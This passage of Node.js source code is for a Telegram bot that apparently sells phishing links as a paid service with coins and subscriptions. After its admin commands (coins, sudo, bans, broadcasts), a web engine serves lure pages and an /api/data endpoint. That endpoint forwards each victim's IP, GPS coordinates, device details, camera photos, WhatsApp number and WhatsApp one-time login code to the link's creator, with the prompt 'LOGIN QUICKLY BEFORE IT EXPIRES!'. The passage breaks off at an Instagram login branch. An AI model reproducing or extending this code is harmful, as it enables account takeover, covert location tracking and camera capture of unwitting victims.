        if (!userState[chatId]) userState[chatId] = { template: 'Device' };
        askRedirect(msg, Math.random().toString(36).substring(7));
    } else if (data === 'use_redirect') {
        if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "⚠️ Session Expired. Click create again."});
        userState[chatId].step = 'await_redirect_url';
        bot.sendMessage(chatId, makeBorder("REDIRECT", `<b>🌐: ${_fnt("SEND YOUR DESTINATION URL")}</b>`), { parse_mode: 'HTML' });
    } else if (data === 'no_redirect') {
        if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "⚠️ Session Expired."});
        createFinalLink(msg, userState[chatId].name, null);
    }
});

// --- Admin Commands ---

bot.onText(/\/gift\s+(\d+)\s+(.+)/, async (msg, match) => {
    if (msg.chat.type !== 'private') return;
    const amount = parseInt(match[1]);
    const inputTarget = match[2];
    
    const sender = await User.findOne({ chatId: msg.from.id });
    if (!sender || sender.coins < amount) {
        return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("INSUFFICIENT COINS")}`), {parse_mode:'HTML'});
    }
    if (amount <= 0) return bot.sendMessage(msg.chat.id, "❌ Invalid Amount");

    const targetUser = await resolveUser(msg, inputTarget);
    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND IN DATABASE")}`), {parse_mode:'HTML'});

    sender.coins -= amount;
    targetUser.coins += amount;
    
    await sender.save();
    await targetUser.save();

    bot.sendMessage(msg.chat.id, makeBorder("GIFT SENT", `✅: ${_fnt("YOU SENT")} ${amount} ${_fnt("COINS TO")} ${targetUser.firstName}`), {parse_mode:'HTML'});
    bot.sendMessage(targetUser.chatId, makeBorder("GIFT RECEIVED", `🎉: ${_fnt("YOU RECEIVED")} ${amount} ${_fnt("COINS FROM")} ${sender.firstName}`), {parse_mode:'HTML'});
});

bot.onText(/\/gift$/, (msg) => {
    if (msg.chat.type !== 'private') return;
    bot.sendMessage(msg.chat.id, makeBorder("HOW TO USE", `✍️ <b>${_fnt("USAGE")}:</b>\n<code>/gift [amount] [userID/Username]</code>\n\nExample: <code>/gift 10 123456789</code>`), {parse_mode:'HTML'});
});

bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;
    
    if (!match[1] && !msg.reply_to_message) {
        const sudos = await User.find({ isSudo: true });
        let txt = `<b>┏━「 ${_fnt("SUDO LIST")} 」</b>\n`;
        let count = 0;
        
        for (const id of OWNER_IDS) {
            const u = await User.findOne({ chatId: id });
            txt += `<b>┣ 🆔 <code>${id}</code>\n┃ ┗ 👤 ${u ? `<a href="tg://user?id=${id}">${u.firstName}</a>` : "Owner (DB Pending)"} [OWNER]</b>\n`;
            count++;
        }
        for (const s of sudos) {
            if (OWNER_IDS.includes(s.chatId)) continue;
            txt += `<b>┣ 🆔 <code>${s.chatId}</code>\n┃ ┗ 👤 <a href="tg://user?id=${s.chatId}">${s.firstName}</a></b>\n`;
            count++;
        }
        txt += `<b>┗━➾ ${_fnt("TOTAL")}: ${count}</b>`;
        return bot.sendMessage(msg.chat.id, txt, {parse_mode:'HTML'});
    }

    let input = match[1];
    let isRemove = false;
    
    if (input) {
        if (input.toLowerCase() === 'r' && msg.reply_to_message) {
            isRemove = true;
            input = undefined;
        } else if (input.toLowerCase().startsWith('r ')) {
            isRemove = true;
            input = input.substring(2).trim();
        }
    } else if (msg.reply_to_message && msg.text && msg.text.toLowerCase().trim() === '/sudo r') {
        isRemove = true;
    }

    let targetId;
    let targetName = "User";

    if (msg.reply_to_message) {
        targetId = msg.reply_to_message.from.id;
        targetName = msg.reply_to_message.from.first_name || "User";
    } else if (input) {
        const cleanInput = input.trim().replace('@', '');
        if (/^\d+$/.test(cleanInput)) {
            targetId = parseInt(cleanInput);
        } else {
            const u = await User.findOne({ username: { $regex: new RegExp(`^${cleanInput}$`, 'i') } });
            if (u) {
                targetId = u.chatId;
                targetName = u.firstName;
            }
        }
    }

    if (!targetId || isNaN(targetId)) {
        return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
    }
    
    let targetUser = await User.findOne({ chatId: targetId });
    if (!targetUser) {
        targetUser = new User({ chatId: targetId, firstName: targetName, isSudo: !isRemove });
    } else {
        targetUser.isSudo = !isRemove;
    }
    await targetUser.save();
    
    bot.sendMessage(msg.chat.id, makeBorder("SUDO UPDATE", `✅: ${targetUser.firstName || targetId} ${_fnt("SUDO ACCESS IS NOW")}: <b>${targetUser.isSudo}</b>`), {parse_mode:'HTML'});
});

bot.onText(/\/share\s+(on|off)/i, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const state = match[1].toLowerCase();
    shareSystemEnabled = (state === 'on');
    bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `✅: ${_fnt("REFERRAL SYSTEM IS NOW")} <b>${state.toUpperCase()}</b>`), {parse_mode:'HTML'});
});

async function modifyOrAddSub(msg, match, type) {
    if (!(await checkAdmin(msg.from.id))) return;

    const amtStr = match[1].toLowerCase();
    const inputTarget = match[2]; 
    const targetUser = await resolveUser(msg, inputTarget);

    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});

    if (amtStr.match(/[dmy]$/)) {
        const val = parseInt(amtStr);
        let multiplier = 0;
        if (amtStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
        else if (amtStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
        else if (amtStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
        
        targetUser.subscriptionExpiry = new Date(Date.now() + (val * multiplier));
        await targetUser.save();
        
        bot.sendMessage(msg.chat.id, makeBorder("ADMIN (SUBS)", `✅: ${_fnt("ADDED")} ${val}${amtStr.slice(-1)} ${_fnt("SUBSCRIPTION")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
        bot.sendMessage(targetUser.chatId, makeBorder("SUBSCRIPTION", `🎉: ${_fnt("YOU HAVE RECEIVED A SUBSCRIPTION FOR")} ${val}${amtStr.slice(-1)}! ${_fnt("UNLIMITED FREE USAGE.")}`), {parse_mode:'HTML'});
        return;
    }

    const amount = parseInt(amtStr);
    if (isNaN(amount)) return bot.sendMessage(msg.chat.id, "❌ Invalid format");

    if (type === 'add') {
        targetUser.coins += amount;
        await targetUser.save();
        bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `✅: ${_fnt("ADDED")} ${amount} ${_fnt("COINS")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
        bot.sendMessage(targetUser.chatId, makeBorder("BALANCE", `💰: +${amount} ${_fnt("COINS ADDED!")}`), {parse_mode:'HTML'});
    } else {
        targetUser.coins = Math.max(0, targetUser.coins - amount);
        await targetUser.save();
        bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `⛔️: ${_fnt("REMOVED")} ${amount} ${_fnt("COINS")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
    }
}

bot.onText(/\/add\s+([\d]+[dmy]?|\d+)(?:\s+(.+))?/i, (msg, match) => modifyOrAddSub(msg, match, 'add'));
bot.onText(/\/(?:rem|rm)\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyOrAddSub(msg, match, 'rem'));

bot.onText(/\/reset(?:\s+(.+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const targetUser = await resolveUser(msg, match[1]);
    
    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
    
    targetUser.coins = 0;
    targetUser.freeUrlsLeft = 4;
    targetUser.referralCount = 0; 
    targetUser.subscriptionExpiry = null;
    await targetUser.save();
    
    await Link.deleteMany({ creatorChatId: targetUser.chatId });
    
    bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `✅: ${_fnt("ACCOUNT RESET SUCCESSFUL")}\n👤: ${targetUser.firstName}\n🗑: ${_fnt("ALL LINKS DELETED, COINS 0")}`), {parse_mode:'HTML'});
    bot.sendMessage(targetUser.chatId, makeBorder("SYSTEM", `🔄: ${_fnt("YOUR ACCOUNT HAS BEEN RESET BY ADMIN!")}`), {parse_mode:'HTML'});
});

bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const user = await resolveUser(msg, match[1]);
    if(user) { user.isBanned = true; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("BAN", `🚫: ${_fnt("BANNED")} ${user.firstName}`), {parse_mode:'HTML'}); }
});

bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const user = await resolveUser(msg, match[1]);
    if(user) { user.isBanned = false; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("UNBAN", `✅: ${_fnt("UNBANNED")} ${user.firstName}`), {parse_mode:'HTML'}); }
});

bot.onText(/\/ulist/, async (msg) => {
    if (!(await checkAdmin(msg.from.id))) return;

    try {
        const links = await Link.find({});
        if (links.length === 0) return bot.sendMessage(msg.chat.id, `<b>📭 ${_fnt("NO ACTIVE LINKS IN SERVER")}</b>`, {parse_mode:'HTML'});

        const userGroups = {};
        links.forEach(l => {
            if (!userGroups[l.creatorChatId]) userGroups[l.creatorChatId] = 0;
            userGroups[l.creatorChatId]++;
        });

        let report = `📂 <b>${_fnt("ACTIVE LINKS SUMMARY")}</b>\n\n`;
        for (const uid in userGroups) {
            const user = await User.findOne({ chatId: uid });
            const name = user && user.firstName ? escapeHtml(user.firstName) : 'Unknown';
            const coins = user ? user.coins : 0;
            report += `👤 <b><a href="tg://user?id=${uid}">${name}</a></b>\n`;
            report += `🆔 ${_fnt("ID")}: <code>${uid}</code>\n`;
            report += `💰 ${_fnt("COINS")}: <b>${coins}</b>\n`;
            report += `🔗 ${_fnt("LINKS")}: <b>${userGroups[uid]}</b>\n`;
            report += `────────────────────\n`;
        }

        bot.sendMessage(msg.chat.id, makeBorder("LINK MANAGER", report), {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "📝 " + _fnt("HOW TO REMOVE"), callback_data: "rm_guide" }]] }
        });
    } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error."); }
});

bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;

    let targetId;
    if (msg.reply_to_message) {
        targetId = msg.reply_to_message.from.id;
    } else if (match[1]) {
        targetId = parseInt(match[1]);
    } else {
        return bot.sendMessage(msg.chat.id, "❌ Please provide a User ID or reply to their message.");
    }

    const userLinks = await Link.find({ creatorChatId: targetId });
    if (userLinks.length === 0) return bot.sendMessage(msg.chat.id, `❌ No active links for <code>${targetId}</code>`, {parse_mode:'HTML'});

    let linkMsg = `👤 <b>${_fnt("USER")}:</b> <code>${targetId}</code>\n`;
    linkMsg += `📊 <b>${_fnt("ACTIVE")}:</b> ${userLinks.length}\n\n`;

    userLinks.forEach((l, i) => {
        linkMsg += `<b>${i + 1}.</b> [${l.templateType}] <code>${l.shortId}</code> | ${l.customName || 'No Name'}\n`;
    });

    bot.sendMessage(msg.chat.id, makeBorder("USER LINK LIST", linkMsg), {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "🗑️ " + _fnt("DELETE SPECIFIC"), callback_data: `prompt_del_${targetId}` }],
                [{ text: "🔥 " + _fnt("DELETE ALL"), callback_data: `delall_${targetId}` }]
            ]
        }
    });
});

bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const targetId = parseInt(match[1]);
    const input = match[2].trim().toLowerCase();

    if (input === "all") {
        const res = await Link.deleteMany({ creatorChatId: targetId });
        bot.sendMessage(msg.chat.id, `✅ Success! ${res.deletedCount} links removed.`);
    } else {
        const userLinks = await Link.find({ creatorChatId: targetId });
        const nums = input.split(/\s+/).map(n => parseInt(n) - 1);
        
        let count = 0;
        for (let i of nums) {
            if (userLinks[i]) {
                await Link.deleteOne({ _id: userLinks[i]._id });
                count++;
            }
        }
        bot.sendMessage(msg.chat.id, `✅ Removed ${count} specific link(s).`);
    }
});

bot.onText(/\/menu/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (!(await checkAdmin(fromId))) return;
    if (msg.chat.type !== 'private') {
        return bot.sendMessage(chatId, `❌ <b>${_fnt("THIS COMMAND ONLY WORKS IN BOT DM")}</b>`, { parse_mode: 'HTML' });
    }

    let menu = `👋 ${_fnt("HELLO ADMIN, I AM")} <b>${_fnt("NIKO")}</b>\n`;
    menu += `${_fnt("HERE ARE YOUR POWERFUL COMMANDS")}:\n\n`;

    menu += `👤 <b>${_fnt("USER MANAGEMENT")}</b>\n`;
    menu += `├ <code>/data</code> - ${_fnt("SHOW YOUR PROFILE")}\n`;
    menu += `├ <code>/data</code> [REPLY/ID] - ${_fnt("FULL DB INFO")}\n`;
    menu += `└ <code>/users</code> - ${_fnt("GET USER LIST (.TXT)")}\n\n`;

    menu += `🔗 <b>${_fnt("LINK MANAGEMENT")}</b>\n`;
    menu += `├ <code>/ulist</code> - ${_fnt("ALL ACTIVE LINK USERS")}\n`;
    menu += `├ <code>/ulink</code> [ID/REPLY] - ${_fnt("USER LINK LIST")}\n`;
    menu += `└ <code>/rmlink</code> [ID] [NUM/ALL] - ${_fnt("DELETE")}\n\n`;

    menu += `💰 <b>${_fnt("CONTROL SYSTEM")}</b>\n`;
    menu += `├ <code>/add</code> [QTY/1d,1m,1y] [ID] - ${_fnt("ADD COINS/SUBS")}\n`;
    menu += `├ <code>/rm</code> [QTY] [ID] - ${_fnt("REMOVE COINS")}\n`;
    menu += `├ <code>/reset</code> [ID] - ${_fnt("RESET ACCOUNT")}\n`;
    menu += `├ <code>/sudo</code> [ID] / r [ID] - ${_fnt("TOGGLE/REMOVE SUDO")}\n`;
    menu += `├ <code>/share on|off</code> - ${_fnt("TOGGLE REFERRAL")}\n`;
    menu += `├ <code>/ban</code> [ID/REPLY] - ${_fnt("RESTRICT USER")}\n`;
    menu += `└ <code>/unban</code> [ID/REPLY] - ${_fnt("LIFT BAN")}\n\n`;

    menu += `📢 <b>${_fnt("BROADCAST & OFFER SYSTEM")}</b>\n`;
    menu += `├ <code>/broadcast</code> [text/media] - ${_fnt("SEND MESSAGE")}\n`;
    menu += `├ <code>/ref</code> [html text] - ${_fnt("BROADCAST WITH REFERRAL")}\n`;
    menu += `└ <code>/offer</code> [5/1w] [text] - ${_fnt("24H SPECIAL OFFER")}\n\n`;

    const menuBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;

    bot.sendMessage(chatId, menuBorder("ADMIN PANEL", menu), { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [[{ text: "📢 " + _fnt("SUPPORT GROUP"), url: "https://t.me/Codex_teamx" }]]
        }
    });
});

bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const isOwner = await checkAdmin(msg.from.id);
    
    let targetUser;
    if (msg.reply_to_message) {
        targetUser = await User.findOne({ chatId: msg.reply_to_message.from.id });
    } else if (match[1]) {
        targetUser = await resolveUser(msg, match[1]);
    } else {
        targetUser = await User.findOne({ chatId: msg.from.id });
    }

    if (!targetUser) {
        return bot.sendMessage(chatId, `<b>❌ ${_fnt("USER NOT FOUND")}</b>`, { parse_mode: 'HTML' });
    }

    try {
        const activeLinkCount = await Link.countDocuments({ creatorChatId: targetUser.chatId });
        const member = await bot.getChatMember(chatId, targetUser.chatId).catch(() => null);
        const status = (member && (['member', 'creator', 'administrator'].includes(member.status))) ? "🟢 ONLINE" : "🔴 OFFLINE";

        let content = "";
        
        if (isOwner) {
            const regDate = targetUser.joinedAt ? new Date(targetUser.joinedAt).toLocaleDateString() : "N/A";
            content += `👤 ${_fnt("NAME")}: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
            content += `🆔 ${_fnt("USER ID")}: <code>${targetUser.chatId}</code>\n`;
            content += `🏷 ${_fnt("USER")}: @${targetUser.username || 'N/A'}\n`;
            content += `💰 ${_fnt("COINS")}: <code>${targetUser.coins}</code>\n`;
            content += `🎁 ${_fnt("FREE")}: <code>${targetUser.freeUrlsLeft}</code>\n`;
            if(hasActiveSub(targetUser)) content += `💎 ${_fnt("SUB")}: <code>${getSubTimeLeft(targetUser)}</code>\n`;
            content += `🔗 ${_fnt("ACTIVE")}: <code>${activeLinkCount}</code>\n`;
            content += `📡 ${_fnt("STATUS")}: <b>${status}</b>\n`;
            content += `🛡 ${_fnt("BAN")}: <b>${targetUser.isBanned ? "YES" : "NO"}</b>\n`;
            content += `📅 ${_fnt("REG DATE")}: <code>${regDate}</code>`;
        } else {
            content += `👤 ${_fnt("NAME")}: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
            content += `🆔 ${_fnt("USER ID")}: <code>${targetUser.chatId}</code>\n`; 
            content += `🏷 ${_fnt("USER")}: @${targetUser.username || 'N/A'}\n`;
            content += `📡 ${_fnt("STATUS")}: <b>${status}</b>`;
        }

        const shortBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;

        bot.sendMessage(chatId, shortBorder(isOwner ? "ADMIN DATA VIEW" : "USER PROFILE", content), { parse_mode: 'HTML' });

    } catch (e) { bot.sendMessage(chatId, `❌ ${_fnt("ERROR PREPARING DATA")}`); }
});

bot.onText(/\/users/, async (msg) => {
    if (!(await checkAdmin(msg.from.id))) return;

    try {
        const users = await User.find({});
        const totalUsers = users.length;
        const activeLinks = await Link.countDocuments();
        const bannedUsers = await User.countDocuments({ isBanned: true });

        let report = `📊 <b>${_fnt("SYSTEM STATISTICS")}</b>\n\n`;
        report += `👥 <b>${_fnt("TOTAL USERS")}:</b> <code>${totalUsers}</code>\n`;
        report += `🔗 <b>${_fnt("ACTIVE LINKS")}:</b> <code>${activeLinks}</code>\n`;
        report += `🚫 <b>${_fnt("BANNED USERS")}:</b> <code>${bannedUsers}</code>\n`;
        
        await bot.sendMessage(msg.chat.id, makeBorder("STATS", report), { parse_mode: 'HTML' });

        let fileContent = `Ｄｘ－Ｓｉｍｕ USER DATABASE REPORT\nGenerated on: ${new Date().toLocaleString()}\n--------------------------------------------------\n\n`;

        users.forEach((u, index) => {
            const status = u.isBanned ? "BANNED 🚫" : "VALID ✅";
            const date = u.joinedAt ? new Date(u.joinedAt).toLocaleDateString() : "N/A";
            
            fileContent += `${index + 1}. ID: ${u.chatId}\n   NAME: ${u.firstName || 'N/A'}\n   USER: @${u.username || 'N/S'}\n   COINS: ${u.coins || 0}\n   FREE LEFT: ${u.freeUrlsLeft || 0}\n   SUB: ${hasActiveSub(u) ? "YES" : "NO"}\n   DATE: ${date}\n   STATUS: ${status}\n--------------------------------------------------\n`;
        });

        const filePath = `./all_users_report.txt`;
        fs.writeFileSync(filePath, fileContent);

        await bot.sendDocument(msg.chat.id, filePath, { caption: `📄 <b>${_fnt("ALL USER DETAILS REPORT")}</b>`, parse_mode: 'HTML' });
        fs.unlinkSync(filePath);

    } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error generating user report."); }
});

async function handleBroadcast(msg) {
    if (!(await checkAdmin(msg.from.id))) return;

    let rawText = msg.text || msg.caption || "";
    rawText = rawText.replace('/broadcast', '').trim();
    
    let isPin = false;
    if (rawText.includes('(pin)')) {
        isPin = true;
        rawText = rawText.replace('(pin)', '').trim();
    }

    let reply_markup = null;
    const btnMatch = rawText.match(/\[(.*)\|(.*)\]/);
    if (btnMatch) {
        rawText = rawText.replace(btnMatch[0], "").trim();
        reply_markup = { inline_keyboard: [[{ text: btnMatch[1].trim(), url: btnMatch[2].trim() }]] };
    }

    const replyMsg = msg.reply_to_message;
    if (!rawText && !msg.photo && !msg.video && !msg.document && !replyMsg) return bot.sendMessage(msg.chat.id, "❌ EMPTY", {parse_mode:'HTML'});

    const users = await User.find({});
    bot.sendMessage(msg.chat.id, `⏳ <b>${_fnt("SENDING TO")} ${users.length} ${_fnt("USERS")}...</b>`, {parse_mode:'HTML'});

    let success = 0;
    let failed = 0;
    let blocked = 0;

    for (const u of users) {
        try {
            let sentMsg;
            if (replyMsg) {
                sentMsg = await bot.copyMessage(u.chatId, msg.chat.id, replyMsg.message_id, { reply_markup });
            } else if (msg.photo) {
                sentMsg = await bot.sendPhoto(u.chatId, msg.photo[msg.photo.length - 1].file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
            } else if (msg.video) {
                sentMsg = await bot.sendVideo(u.chatId, msg.video.file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
            } else if (msg.document) {
                sentMsg = await bot.sendDocument(u.chatId, msg.document.file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
            } else {
                sentMsg = await bot.sendMessage(u.chatId, rawText, { parse_mode: 'HTML', reply_markup });
            }
            
            if (isPin && sentMsg) await bot.pinChatMessage(u.chatId, sentMsg.message_id);
            success++;
        } catch (e) {
            if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
            else failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); 
    }
    
    const reportMsg = `✅ <b>${_fnt("BROADCAST COMPLETED")}</b>
━━━━━━━━━━━━━━━━━
👤 ${_fnt("TOTAL TARGETS")}: <code>${users.length}</code>
📨 ${_fnt("SENT SUCCESS")}: <code>${success}</code>
🚫 ${_fnt("BLOCKED/REMOVED")}: <code>${blocked}</code>
❌ ${_fnt("FAILED/ERROR")}: <code>${failed}</code>
━━━━━━━━━━━━━━━━━`;

    bot.sendMessage(msg.chat.id, reportMsg, {parse_mode:'HTML'});
}

bot.onText(/\/ref\s+(.+)/s, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    
    const htmlText = match[1];
    const users = await User.find({});
    bot.sendMessage(msg.chat.id, `⏳ <b>${_fnt("SENDING REFERRAL BROADCAST TO")} ${users.length} ${_fnt("USERS")}...</b>`, {parse_mode:'HTML'});
    
    let success = 0, failed = 0, blocked = 0;
    for (const u of users) {
        try {
            const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${u.chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
            await bot.sendMessage(u.chatId, htmlText, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "📲 " + _fnt("SHARE NOW"), url: inviteUrl }]] }
            });
            success++;
        } catch(e) {
            if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
            else failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); 
    }
    
    bot.sendMessage(msg.chat.id, `✅ <b>${_fnt("REFERRAL BROADCAST COMPLETED")}!</b>\nSUCCESS: <code>${success}</code> | BLOCKED: <code>${blocked}</code> | FAILED: <code>${failed}</code>`, {parse_mode:'HTML'});
});

bot.onText(/\/offer\s+([a-zA-Z0-9]+)\s+(.+)/s, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    
    const rewardStr = match[1].toLowerCase();
    const htmlText = match[2];
    
    let rewardType = 'coin';
    let value = parseInt(rewardStr);
    
    if (rewardStr.match(/[dwmy]$/)) {
        rewardType = 'sub';
        value = rewardStr;
    } else if (isNaN(value)) {
        return bot.sendMessage(msg.chat.id, "❌ Invalid offer value");
    }
    
    activeOffer = { rewardType, value, expiry: Date.now() + 24 * 60 * 60 * 1000 };
    
    const users = await User.find({});
    bot.sendMessage(msg.chat.id, `⏳ <b>${_fnt("SENDING OFFER BROADCAST TO")} ${users.length} ${_fnt("USERS")}...</b>`, {parse_mode:'HTML'});
    
    let success = 0, failed = 0, blocked = 0;
    for (const u of users) {
        try {
            const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${u.chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
            await bot.sendMessage(u.chatId, htmlText, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "📲 " + _fnt("SHARE NOW"), url: inviteUrl }]] }
            });
            success++;
        } catch(e) {
            if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
            else failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); 
    }
    
    bot.sendMessage(msg.chat.id, `✅ <b>${_fnt("OFFER BROADCAST COMPLETED")}!</b>`, {parse_mode:'HTML'});
    
    setTimeout(() => {
        if (activeOffer && activeOffer.expiry <= Date.now() + 1000) activeOffer = null;
    }, 24 * 60 * 60 * 1000);
});

// --- Web Engine & APIs ---

app.get('/', (req, res) => res.send("DX-CODEX System Online"));

app.get('/w/:id', async (req, res) => {
    try {
        const link = await Link.findOne({ shortId: req.params.id });
        if (!link) return res.status(404).send("INVALID OR EXPIRED LINK");

        const folderName = link.templateType || 'Device';
        const filePath = path.join(__dirname, 'X', folderName, 'index.html');

        if (!fs.existsSync(filePath)) {
            return res.status(500).send(`Template [${folderName}] index.html missing in server directory!`);
        }

        let htmlContent = fs.readFileSync(filePath, 'utf8');
        const safeRedirect = link.originalUrl || "null";
        
        htmlContent = htmlContent.replace(/{{LINK_ID}}/g, link.shortId);
        htmlContent = htmlContent.replace(/{{REDIRECT_URL}}/g, safeRedirect);

        res.send(htmlContent);
    } catch (e) {
        res.status(500).send("Internal Server Error");
    }
});

app.post('/api/data', async (req, res) => {
    const { linkId, type, data } = req.body;
    const link = await Link.findOne({ shortId: linkId });
    if (!link) return res.json({ status: 'error' });
    const owner = link.creatorChatId;

    try {
        if (type === 'info') {
            const _n = data.ipData;
            const _nav = data.navigator;
            const _batt = data.battery;
            const _gpu = data.gpu;

            let msg = `<blockquote><b>${_fnt("CODEX DEVICE INFO")}</b></blockquote>\n\n`;
            msg += `<b>${_fnt("DEVICE")}:</b> <code>${_nav.platform}</code>\n`;
            msg += `<b>${_fnt("IP ADDRESS")}:</b> <a href="https://ipwho.is/${_n.ip}">${_n.ip}</a>\n`;
            msg += `<b>${_fnt("NETWORK")}:</b> <code>${_n.isp}</code>\n`;
            msg += `<b>${_fnt("LOCATION")}:</b> <code>${_n.city}, ${_n.country}</code>\n`;
            msg += `<b>${_fnt("COORDINATES")}:</b> <code>${_n.loc}</code>\n`;
            msg += `<b>${_fnt("BATTERY")}:</b> <code>${_batt}</code>\n`;
            msg += `<b>${_fnt("CPU CORES")}:</b> <code>${_nav.hardwareConcurrency || 'N/A'}</code>\n`;
            msg += `<b>${_fnt("RAM")}:</b> <code>${_nav.deviceMemory || 'N/A'} GB</code>\n`;
            msg += `<b>${_fnt("GPU")}:</b> <code>${_gpu}</code>\n`;
            msg += `<b>${_fnt("SCREEN")}:</b> <code>${data.screen.width}x${data.screen.height} (${data.screen.depth}-bit)</code>\n`;
            msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
            msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${_nav.language}</code>\n`;
            msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${_nav.userAgent}</pre>\n\n`;
            msg += `<blockquote>${_fnt("DEV-BY: DX-SIMU || ")}@Termuxcodex</blockquote>`;

            await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
            
        } else if (type === 'cam') {
            const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            await bot.sendPhoto(owner, buffer, { caption: makeBorder("CAMERA", `📱: ${data.platform}`), parse_mode: 'HTML' });
            
        } else if (type === 'loc') {
            let locMsg = `<b>┏━━「 ${_fnt("LOCATION DATA")} 」━━┓</b>\n`;
            locMsg += `┃ 📍 <b>${_fnt("LATITUDE")}:</b> <code>${data.lat}</code>\n`;
            locMsg += `┃ 📍 <b>${_fnt("LONGITUDE")}:</b> <code>${data.lon}</code>\n`;
            locMsg += `┃ 🗺 <b>${_fnt("MAPS")}:</b> <a href="https://maps.google.com/?q=${data.lat},${data.lon}">Google Maps</a>\n`;
            locMsg += `<b>┗━━━━━━━━━━┛</b>`;
            await bot.sendMessage(owner, locMsg, { parse_mode: 'HTML', disable_web_page_preview: true });
            
        } else if (type === 'wa_phone') {
            let msg = `<b>┏━━「 ${_fnt("WHATSAPP NUMBER HIT")} 」━━┓</b>\n`;
            msg += `┃ 📱 <b>${_fnt("NUMBER")}:</b> <code>${data.phone}</code>\n`;
            msg += `┃ 🌍 <b>${_fnt("COUNTRY")}:</b> <code>${data.country_name}</code>\n`;
            msg += `┃ 📍 <b>${_fnt("IP ADDRESS")}:</b> <code>${data.detected_ip}</code>\n`;
            msg += `<b>┗━━━━━━━━━━━━━━━━━━━━━━┛</b>`;
            await bot.sendMessage(owner, msg, {parse_mode:'HTML'});
            
        } else if (type === 'wa_otp') {
            let msg = `<b>┏━━「 🚨 ${_fnt("WHATSAPP OTP RECEIVED")} 」━━┓</b>\n`;
            msg += `┃ 📱 <b>${_fnt("NUMBER")}:</b> <code>${data.phone}</code>\n`;
            msg += `┃ 🔑 <b>${_fnt("OTP CODE")}:</b> <code>${data.otp}</code>\n`;
            msg += `┃ 🌍 <b>${_fnt("COUNTRY")}:</b> <code>${data.country_name}</code>\n`;
            msg += `<b>┗━━━━━━━━━━━━━━━━━━━━━━━┛</b>\n`;
            msg += `<blockquote>⚡️ ${_fnt("LOGIN QUICKLY BEFORE IT EXPIRES!")}</blockquote>`;
            await bot.sendMessage(owner, msg, {parse_mode:'HTML'});
            
        } else if (type === 'ig_login') {
